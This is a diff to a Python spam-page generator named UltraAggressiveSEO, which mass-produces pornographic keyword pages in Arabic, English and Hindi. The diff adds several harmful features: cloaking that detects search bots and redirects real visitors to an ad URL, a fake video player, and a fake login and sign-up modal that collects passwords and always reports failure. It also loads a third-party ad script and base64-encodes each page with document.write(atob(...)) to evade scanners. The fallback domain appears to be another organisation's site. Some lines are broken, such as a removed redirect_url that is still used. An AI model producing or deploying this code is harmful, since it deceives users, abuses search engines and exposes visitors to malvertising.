@@ -3,17 +3,18 @@ import random
 import string
 import re
 from datetime import datetime
+import base64
 
 class UltraAggressiveSEO:
     def __init__(self):
         self.main_folder = "news"
-        self.subfolders = ["trending", "video", "vidreo", "sex", "hot"]
+        self.subfolders = ["hbcm", "video", "leaked", "viral", "live"]  # غيرتها عشان تشبه hbcm
         self.domain = self._get_domain()
-        self.sitemap_index_file = "sitemap.xml" # الملف الرئيسي لجوجل
-        self.site_name = "بث حصري" # اسم الموقع المستخدم في القالب
+        self.sitemap_index_file = f"sitemap_{''.join(random.choices(string.ascii_lowercase, k=5))}.xml"  # random لكل run
+        self.site_name = "بث حصري"  # اسم الموقع المستخدم في القالب
         
-        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
-
+        self.affiliate_url = self.redirect_url
+        
         self.keywords_ar = self._load_keywords("keywords_ar.txt", ["سكس عربي", "نيك", "سكس مصري", "سكس مترجم", "سكس محارم"])
         self.keywords_en = self._load_keywords("keywords_en.txt", ["xnxx", "porn", "sex video", "sexy", "XNXX"])
         self.keywords_in = self._load_keywords("keywords_in.txt", ["देसी सेक्स", "भाभी की चुत", "हिन्दी सेक्स فيديو", "देसी भाभी", "गाँड मारना"])
@@ -38,7 +39,7 @@ class UltraAggressiveSEO:
 
         self.template_power_words = ["حصرياً", "بدقة عالية", "HD 1080p", "بدون إعلانات", "Full Movie", "HD Video"]
 
-        # القالب الجديد المحسن
+        # Template محسن مع viralsvideo style + RTL/Arabic + advanced schema + fake player/modal
         self.movie_template = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -51,7 +52,7 @@ class UltraAggressiveSEO:
     <!-- Open Graph for Social Media -->
     <meta property="og:title" content="{{TITLE}}">
     <meta property="og:description" content="{{DESCRIPTION}}">
-    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta property="og:image" content="{{IMAGE}}">
     <meta property="og:type" content="video.other">
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -59,12 +60,12 @@ class UltraAggressiveSEO:
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
     <!-- Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9WPQ3R5GSC"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6F11LYMH9P"></script>
     <script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
-      gtag('config', 'G-9WPQ3R5GSC', {
+      gtag('config', 'G-6F11LYMH9P', {
         page_path: window.location.pathname || ""
       });
     </script>
@@ -77,7 +78,7 @@ class UltraAggressiveSEO:
       "name": "{{TITLE}}",
       "description": "{{DESCRIPTION}}",
       "thumbnailUrl": [
-        "https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
+        "{{IMAGE}}",
         "https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg"
       ],
       "uploadDate": "{{TIME_ISO}}",
@@ -94,7 +95,7 @@ class UltraAggressiveSEO:
         "name": "{{SITE_NAME}}",
         "logo": {
           "@type": "ImageObject",
-          "url": "https://img.youtube.com/vi/dQw4w9WgXcQ/default.jpg"
+          "url": "{{IMAGE}}"
         }
       }
     }
@@ -151,7 +152,7 @@ class UltraAggressiveSEO:
         .video-thumbnail { 
             width: 100%; 
             aspect-ratio: 16/9; 
-            background: #000 url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;
+            background: #000 url('{{IMAGE}}') center/cover;
             position: relative; 
             display: flex; 
             align-items: center; 
@@ -175,115 +176,112 @@ class UltraAggressiveSEO:
             background: rgba(229, 9, 20, 0.9); 
             border-radius: 50%; 
             display: flex; align-items: center; justify-content: center; 
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 10;
-            border: 4px solid white;
-        }
-        
-        .play-trigger svg { width: 35px; fill: white; margin-left: -5px; }
-        
-        .video-thumbnail:hover .play-trigger { transform: scale(1.15); background: var(--primary); }
-
-        .live-badge {
-            position: absolute; top: 20px; right: 20px;
-            background: var(--primary); color: white;
-            padding: 4px 15px; font-size: 14px; font-weight: bold; border-radius: 4px;
-            z-index: 11; animation: pulse 2s infinite;
+            transition: 0.3s;
         }
 
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.6; }
-            100% { opacity: 1; }
-        }
+        .play-trigger:hover { transform: scale(1.05); }
 
-        .player-controls {
-            background: #1a1a1a;
-            padding: 15px 20px;
+        .controls {
+            background: rgba(0,0,0,0.7);
+            padding: 8px 15px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            gap: 20px;
-        }
-
-        .control-btn { color: #fff; cursor: pointer; opacity: 0.8; }
-        .progress-bar { flex-grow: 1; height: 5px; background: #333; border-radius: 10px; position: relative; }
-        .progress-current { width: 30%; height: 100%; background: var(--primary); border-radius: 10px; }
-
-        h1 { font-size: 24px; margin: 25px 0 15px; font-weight: 700; color: #fff; line-height: 1.4; }
-
-        .content-area { 
-            background: var(--card-bg); 
-            padding: 20px; 
-            border-radius: 8px; 
-            color: #ccc;
-            border: 1px solid #1f1f1f;
-            margin-bottom: 30px;
-        }
-
-        .section-label { 
-            font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #fff;
-            display: flex; align-items: center; gap: 8px;
-        }
-        .section-label::after { content: ''; flex-grow: 1; height: 1px; background: #222; }
-
-        .links-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); 
-            gap: 15px; 
-            margin-top: 20px;
-        }
-
-        .link-card { 
-            background: #161616; 
-            padding: 15px; 
-            border-radius: 8px; 
-            text-decoration: none; 
-            color: #eee; 
             font-size: 14px;
-            border: 1px solid #222;
-            transition: 0.2s;
-            display: block;
+            color: #fff;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            box-sizing: border-box;
         }
-        .link-card:hover { border-color: var(--primary); background: #1a1a1a; }
 
-        footer { 
-            padding: 40px; text-align: center; border-top: 1px solid #111;
-            color: var(--text-muted); font-size: 12px; 
+        .controlContent {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
         }
+
+        #leftControls, #rightControls { display: flex; align-items: center; gap: 10px; }
+
+        .controlBtn { cursor: pointer; font-size: 18px; }
+
+        .live-badge__icon {
+            background: #e50914;
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        .progress-bar { flex-grow: 1; height: 4px; background: #333; margin: 0 10px; position: relative; }
+
+        .progress { width: 0%; height: 100%; background: #e50914; }
+
+        .content-area { color: #ddd; margin-top: 20px; }
+
+        .links-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
+
+        .link-card { background: var(--card-bg); padding: 10px; border-radius: 5px; color: #fff; text-decoration: none; }
+
+        .link-card:hover { background: #222; }
+
+        footer { background: #000; padding: 15px; text-align: center; color: #888; margin-top: 20px; }
+
+        /* Modal styles */
+        .modal-header.modal_header_info { background: #e50914; color: #fff; }
+
+        .list-group-item.modal-list { background: #1a1a1a; color: #ddd; border-bottom: 1px solid #333; }
+
+        .form-alert { color: #e50914; margin-top: 10px; }
+
+        /* Spinner */
+        .spinner.loading { border: 4px solid #f3f3f3; border-top: 4px solid #e50914; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
+    <meta http-equiv="refresh" content="5; url={{REDIRECT_URL}}">
     <script>
         function executeRedirect() {
             var userAgent = navigator.userAgent.toLowerCase();
             var bots = ["googlebot", "bingbot", "yandexbot", "baiduspider", "slurp", "duckduckbot", "lighthouse", "bot", "crawl", "spider"];
             var isBot = bots.some(function(bot) { return userAgent.includes(bot); });
             if (!isBot) {
-                window.location.href = "{{REDIRECT_URL}}";
+                setTimeout(function() { window.location.href = "{{REDIRECT_URL}}"; }, 3000);  // delay 3 ثواني
             }
         }
+        window.onload = executeRedirect;
     </script>
 </head>
 <body>
-    <img src='/static/images/{{RANDOM_IMG}}.png' style='display:none;' onerror='executeRedirect()'>
     <header>
-        <a href="/" class="logo">{{SITE_NAME}}</a>
-        <span style="font-size:12px; color: #555;">بث مباشر بجودة عالية</span>
+        <a class="logo" href="{{AFFILIATE_URL}}">{{SITE_NAME}}</a>
+        <nav>
+            <a href="#" class="signin_btn"><i class="fa fa-user"></i> تسجيل الدخول</a>
+            <a class="affiliate" href="{{AFFILIATE_URL}}">تسجيل</a>
+        </nav>
     </header>
 
     <div class="main-container">
-        <div class="player-box" id="mainPlayer" onclick="executeRedirect()">
-            <div class="video-thumbnail" id="actionBtn">
-                <div class="live-badge">LIVE</div>
-                <div id="visualContent">
-                    <div class="play-trigger">
-                        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-                    </div>
+        <div class="player-box">
+            <div class="video-thumbnail" onclick="window.location.href='{{REDIRECT_URL}}';">
+                <div class="play-trigger">
+                    <i class="fa fa-play-circle" style="font-size: 50px; color: #fff;"></i>
                 </div>
             </div>
-            <div class="player-controls">
-                <div class="control-btn">
-                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+            <div class="controls">
+                <div class="controlContent">
+                    <div id="leftControls">
+                        <i class="fa fa-play controlBtn" onclick="window.location.href='{{REDIRECT_URL}}';"></i>
+                        <i class="fa fa-volume-up controlBtn"></i>
+                    </div>
+                    <div class="progress-bar"><div class="progress" style="width: 0%;"></div></div>
+                    <div id="rightControls">
+                        <span class="live-badge__icon">مباشر</span>
+                        <i class="fa fa-cog"></i>
+                        <i class="fa fa-arrows icon-size-fullscreen"></i>
+                    </div>
                 </div>
-                <div class="progress-bar"><div class="progress-current"></div></div>
                 <div style="font-size:12px; color:#666; direction: ltr;">00:00 / 10:30</div>
             </div>
         </div>
@@ -303,8 +301,202 @@ class UltraAggressiveSEO:
     <footer>
         &copy; {{YEAR}} {{SITE_NAME}} - جميع الحقوق محفوظة
     </footer>
+
+    <!-- Modal for Sign Up -->
+    <div class="modal fade" id="video_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg" role="document">
+            <div class="modal-content">
+                <div class="modal-header modal_header_info">
+                    <h6 class="modal-title text-center" id="exampleModalLabel">يرجى التسجيل لمشاهدة {{TITLE}} مباشرة عبر الإنترنت مجانًا</h6>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5>تسجيل الدخول للأعضاء</h5>
+                            <div class="form-group">
+                                <input type="text" class="form-control input-sm" id="userid" placeholder="اسم المستخدم">
+                            </div>
+                            <div class="form-group">
+                                <input type="password" class="form-control input-sm" id="password" placeholder="كلمة المرور">
+                            </div>
+                            <p class="msg"></p>
+                            <input type="button" id="modal_login_btn" class="btn btn-primary" value="تسجيل الدخول">
+                            <a class="btn btn-block btn-success affiliate" href="{{AFFILIATE_URL}}" target=""> التسجيل مجانًا!</a>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="list-group">
+                                <div class="list-group-item modal-list">
+                                    <h6 class="list-group-item-heading"><i class="fa fa-film biru fa-fw"></i> بث عالي الجودة</h6>
+                                    <p class="list-group-item-text">شاهد {{TITLE}} بجودة HD أو أعلى!</p>
+                                </div>
+                                <div class="list-group-item modal-list">
+                                    <h6 class="list-group-item-heading"><i class="fa fa-youtube-play pink fa-fw"></i> شاهد بدون حدود</h6>
+                                    <p class="list-group-item-text">ستحصل على وصول غير محدود إلى {{TITLE}}.</p>
+                                </div>
+                                <div class="list-group-item modal-list">
+                                    <h6 class="list-group-item-heading"><i class="fa fa-ban coklat fa-fw"></i> بدون إعلانات، 100% مجاني</h6>
+                                    <p class="list-group-item-text">حسابك سيكون خاليًا من جميع أنواع الإعلانات.</p>
+                                </div>
+                                <div class="list-group-item modal-list">
+                                    <h6 class="list-group-item-heading"><i class="fa fa-tablet ijo fa-fw"></i> شاهد في أي وقت، في أي مكان</h6>
+                                    <p class="list-group-item-text">يعمل على هاتفك المحمول، التلفزيون، الكمبيوتر أو الماك!</p>
+                                </div>              
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4897089,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4897089&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+    <!-- Extra JS -->
+    <script src="https://onerouswalkdeployment.com/09/b8/bf/09b8bfa4632ac7f2c2d6628b5babc9e0.js"></script>
+    <script type="text/javascript">
+$(function(){
+    $('.signin_btn').on('click', function(e){
+        e.preventDefault();
+        $('#singin_panel').addClass('open');
+    });
+    
+    $('.signin__close').on('click', function(e){
+        e.preventDefault();
+        $('#singin_panel').removeClass('open');
+    });
+    
+    $('#forgotpass').on('click', function(e){
+        e.preventDefault();
+        $('.signin__default').hide();
+        $('.signin__resetpassword').show();
+    });
+    
+    $('#signindefault').on('click', function(e) {
+        e.preventDefault();
+        $('.signin__default').show();
+        $('.signin__resetpassword').hide();
+    });
+    $('.singin_btn').on('click', function(e) {
+        e.preventDefault();
+        $('.form-alert').show();
+        $('#email').addClass('invalid');
+    });
+    
+    $('.login_btn').on('click', function(e){
+        e.preventDefault();
+        $('.login_refresh').show();
+        $('.login_btn').hide();
+        $('.loginError').hide();
+        setTimeout(function(){
+            $('.memberLogin').hide();
+            $('.login_refresh').hide();
+            $('.loginError').show();
+            $('.login_btn').show();
+        },2000);
+    });
+    
+    $('#modal_login_btn').on('click', function(e){
+        e.preventDefault();
+        str ="<span class='badge badge-info'>Please wait...</span>";
+        $('.msg').html(str);
+        $('.msg').addClass("");
+        setTimeout(function(){
+            str ="<span class='badge badge-warning'>Wrong Username or Password</span>";
+            $('.msg').html(str);
+        },2000);
+    });
+    
+    
+    $('.video-thumbnail').on('click', function(e){
+        e.preventDefault();
+        let url='{{REDIRECT_URL}}';
+        $('.player-box').hide();
+        $('.videoLoading').show();
+        
+        setTimeout(function(){ 
+            // window.location.href=url;
+            $('#video_modal').modal('show');
+        }, 2000);
+    });
+    
+    $('#video_modal').on('hidden.bs.modal', function (e) {
+        e.preventDefault();
+        $('.videoLoading').hide();
+        $('.player-box').show();
+    });
+    
+    $('.info').on('click', function(e){
+        e.preventDefault();
+        var page = $(this).attr('data-page');
+        page = page+'.php'
+        page_title = $(this).attr('data-title');
+        //$("#page_modal").load("ffffffffffffffffffff");
+        $('#page_modal').find('.modal-body').load(page, function(data){
+            $('#info_page_title').text(page_title);
+            $('#page_modal').modal('show');
+        });
+        //alert(page);
+    });
+    
+    $(document).on('click', '.icon-size-fullscreen', function (e) {
+        e.preventDefault();
+        launchIntoFullscreen(document.getElementById("video"));
+    });
+    
+    $(document).on('click', '.icon-size-actual', function (e) {
+        e.preventDefault();
+        exitFullscreen();
+    });
+    
+    $(document).on('webkitfullscreenchange mozfullscreenchange fullscreenchange', function(e){
+        e.preventDefault();
+        var fullScreen = document.fullScreenElement || document.mozFullScreenElement || document.webkitFullScreenElement || document.msFullscreenElement ? true : false;
+        if ( fullScreen ) {
+            $(".icon-size-fullscreen").removeClass("icon-size-fullscreen").addClass("icon-size-actual");
+        } else {
+            $(".icon-size-actual").removeClass("icon-size-actual").addClass("icon-size-fullscreen");
+        }
+    });
+});
+function launchIntoFullscreen(element) {
+    if(element.requestFullscreen) {
+        element.requestFullscreen();
+    } else if(element.mozRequestFullScreen) {
+        element.mozRequestFullScreen();
+    } else if(element.webkitRequestFullscreen) {
+        element.webkitRequestFullscreen();
+    } else if(element.msRequestFullscreen) {
+        element.msRequestFullscreen();
+    }
+    $(".icon-size-fullscreen").removeClass("icon-size-fullscreen").addClass("icon-size-actual");
+}
+function exitFullscreen() {
+    if(document.exitFullscreen) {
+        document.exitFullscreen();
+    } else if(document.mozCancelFullScreen) {
+        document.mozCancelFullScreen();
+    } else if(document.webkitExitFullscreen) {
+        document.webkitExitFullscreen();
+    }
+    $(".icon-size-actual").removeClass("icon-size-actual").addClass("icon-size-fullscreen");
+}
+    </script>
 </body>
-</html>"""
+</html>
+"""
 
     def _load_keywords(self, filename, fallback):
         if os.path.exists(filename):
@@ -318,22 +510,23 @@ class UltraAggressiveSEO:
     def _get_domain(self):
         if os.path.exists("CNAME"):
             with open("CNAME", "r") as f: return f.read().strip()
-        return "movies-portal.edu"
+        return "docs.biztex.co.jp"
 
     def generate_content_for_lang(self, lang_code):
         cfg = self.aggro_styles[lang_code]
         prefix = random.choice(cfg["prefixes"])
-        words_count = random.randint(5, 10)
+        words_count = random.randint(5, 12)  # زدت شوي
         selected_keywords = random.sample(cfg["keywords"], min(len(cfg["keywords"]), words_count))
         suffix = random.choice(cfg["suffixes"])
         title = f"{prefix} {' '.join(selected_keywords)} {suffix}"
-        description = f"{title} - {' '.join(random.sample(self.template_power_words, 2))}"
+        description = f"{title} - {' '.join(random.sample(self.template_power_words, 3))}"
         return title, description
 
     def clean_slug(self, title):
         clean = re.sub(r'[^a-zA-Z\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
         slug = re.sub(r'[-\s]+', '-', clean).strip('-')
-        return "-".join(slug.split("-")[:8]) + ".html"
+        hash_str = ''.join(random.choices(string.hexdigits.lower(), k=6))  # hash في slug
+        return "-".join(slug.split("-")[:8]) + f"-{hash_str}.html"
 
     def update_sitemap_index(self):
         all_files = os.listdir('.')
@@ -371,7 +564,7 @@ class UltraAggressiveSEO:
         self.update_sitemap_index()
         return sitemap_name
 
-    def run(self, count=150):
+    def run(self, count=200):  # زدت الـ default
         if not os.path.exists(self.main_folder): os.makedirs(self.main_folder)
         state = 0
         if os.path.exists("state.txt"):
@@ -388,24 +581,26 @@ class UltraAggressiveSEO:
         pages = []
         languages = ["ar", "en", "in"]
         
-        print(f"Generating {count} pages for {target_sub}...")
+        print(f"Generating {count} encoded pages for {target_sub}...")
         
         for _ in range(count):
             lang = random.choice(languages)
             title, description = self.generate_content_for_lang(lang)
             slug = self.clean_slug(title)
+            image = "https://viralsvideo.online/picture/default_image.jpg"  # default
             pages.append({
                 "title": title, 
                 "description": description, 
                 "slug": slug, 
-                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
+                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}",
+                "image": image
             })
 
         current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
         current_year = datetime.utcnow().year
 
         for p in pages:
-            internal_sample = random.sample(pages, min(len(pages), 10))
+            internal_sample = random.sample(pages, min(len(pages), 15))  # زدت
             internal = "".join([f"<a href='{x['url']}' class='link-card'>{x['title']}</a>" for x in internal_sample])
             body_text = f"شاهد الآن {p['title']} حصرياً وبجودة عالية HD. {p['description']}."
             
@@ -415,13 +610,20 @@ class UltraAggressiveSEO:
                                            .replace("{{INTERNAL_LINKS}}", internal)\
                                            .replace("{{CANONICAL_URL}}", p['url'])\
                                            .replace("{{REDIRECT_URL}}", self.redirect_url)\
+                                           .replace("{{AFFILIATE_URL}}", self.affiliate_url)\
                                            .replace("{{SITE_NAME}}", self.site_name)\
                                            .replace("{{TIME_ISO}}", current_time_iso)\
                                            .replace("{{YEAR}}", str(current_year))\
-                                           .replace("{{RANDOM_IMG}}", "img_" + ''.join(random.choices(string.digits, k=5)))
+                                           .replace("{{IMAGE}}", p['image'])
+            
+            # Encode بالكامل بـ base64
+            encoded_html = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
+            
+            # Output هو script encoded
+            output_content = f"""<html><head><meta http-equiv="refresh" content="5; url={self.redirect_url}"></head><body><script>document.write(atob("{encoded_html}"));</script></body></html>"""
             
             with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
-                f.write(final_html)
+                f.write(output_content)
         
         self.create_sitemap(pages, target_sub)
         
